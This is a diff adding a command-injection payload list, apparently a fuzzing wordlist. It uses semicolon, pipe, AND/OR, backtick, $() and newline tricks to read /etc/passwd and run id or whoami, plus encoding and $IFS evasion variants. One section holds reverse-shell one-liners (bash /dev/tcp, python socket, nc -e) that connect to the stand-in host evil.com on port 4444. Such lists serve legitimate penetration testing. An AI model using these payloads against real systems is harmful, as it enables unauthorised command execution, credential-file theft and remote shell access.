@@ -1,0 +1,67 @@
+# Command Injection Payloads
+# Targets: shell metacharacters, pipe chains, backticks, $() syntax
+
+# === Semicolon Chaining ===
+;cat /etc/passwd
+; cat /etc/passwd
+;id
+; id
+;ls -la
+; ls -la
+;whoami
+; whoami
+;uname -a
+;ping -c 1 evil.com
+
+# === Pipe Chaining ===
+| cat /etc/passwd
+|cat /etc/passwd
+| id
+| whoami
+| ls -la /
+|ls
+| nc evil.com 4444
+
+# === AND / OR Chaining ===
+&& cat /etc/passwd
+&& id
+|| cat /etc/passwd
+|| id
+& cat /etc/passwd
+& id
+
+# === Backtick Execution ===
+`cat /etc/passwd`
+`id`
+`whoami`
+`uname -a`
+`ls -la`
+
+# === $() Subshell ===
+$(cat /etc/passwd)
+$(id)
+$(whoami)
+$(uname -a)
+$(ls -la)
+$(/bin/bash -c 'id')
+
+# === Newline Injection ===
+%0aid
+%0acat /etc/passwd
+%0d%0aid
+%0d%0awhoami
+
+# === Reverse Shell ===
+;bash -i >& /dev/tcp/evil.com/4444 0>&1
+| bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
+$(bash -c 'exec bash -i &>/dev/tcp/evil.com/4444 <&1')
+; python -c 'import socket,subprocess,os;os.dup2(socket.create_connection(("evil.com",4444)).fileno(),0)'
+| nc -e /bin/sh evil.com 4444
+
+# === Encoding Tricks ===
+%3Bcat%20%2Fetc%2Fpasswd
+%7Cid
+%60id%60
+;$IFS cat$IFS/etc/passwd
+;{cat,/etc/passwd}
+;cat${IFS}/etc/passwd
